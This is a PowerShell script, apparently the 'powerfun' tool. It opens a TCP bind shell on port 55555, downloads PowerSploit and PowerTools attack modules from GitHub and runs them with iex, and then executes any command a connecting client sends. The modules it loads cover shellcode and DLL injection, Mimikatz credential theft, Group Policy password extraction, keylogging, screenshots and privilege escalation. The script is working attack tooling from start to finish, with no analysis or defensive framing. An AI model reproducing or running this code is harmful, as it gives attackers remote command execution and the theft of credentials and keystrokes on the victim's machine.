function Get-Webclient {
    $wc = New-Object Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}

function powerfun {

   $modules = @(
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1',
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1',
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1',
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1',
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1',
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1',
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1',
'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1',
'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1',
'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1')

    $listener = [System.Net.Sockets.TcpListener]55555
    $listener.start()
    [byte[]]$bytes = 0..255|%{0}
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream() 

    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Invoke-Reflective -Full' for more details on any module.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    ForEach ($module in $modules)
    {
       (Get-Webclient).DownloadString($module)|iex
    }

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (IEX $data 2>&1 | Out-String )

        $sendback2  = $sendback + "PS " + (get-location).Path + "> "
	$x = ($error[0] | out-string)
	$error.clear()
	$sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
}

powerfun 



